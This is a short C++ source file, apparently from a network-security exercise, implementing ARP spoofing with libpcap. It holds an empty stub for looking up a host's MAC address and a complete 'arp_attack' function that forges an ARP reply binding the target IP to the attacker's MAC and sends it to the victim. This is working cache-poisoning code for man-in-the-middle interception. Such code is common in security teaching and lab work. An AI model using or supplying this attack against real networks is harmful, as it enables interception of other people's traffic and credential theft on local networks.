#include "spoof.h"
#include "hdr/etharppacket.h"

bool request_and_get_mac(pcap_t* pcap, Mac myMac, Ip myIp, Ip senderIp, Mac senderMac) {
    
}

void arp_attack(pcap_t* handle, const Mac& sender_mac, const Ip& sender_ip, const Ip& target_ip, const Mac& my_mac) {
    EthArpPacket packet;

    packet.ethHdr_.dmac_ = sender_mac;
    packet.ethHdr_.smac_ = my_mac;
    packet.ethHdr_.type_ = htons(EthHdr::ARP);

    packet.arpHdr_.hrd_ = htons(ArpHdr::ETHERNET);
    packet.arpHdr_.pro_ = htons(EthHdr::IP4);
    packet.arpHdr_.hlen_ = Mac::SIZE;
    packet.arpHdr_.plen_ = Ip::SIZE;
    packet.arpHdr_.op_ = htons(ArpHdr::REPLY);
    packet.arpHdr_.smac_ = my_mac;
    packet.arpHdr_.sip_ = htonl(static_cast<uint32_t>(target_ip));
    packet.arpHdr_.tmac_ = sender_mac;
    packet.arpHdr_.tip_ = htonl(static_cast<uint32_t>(sender_ip)); 

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}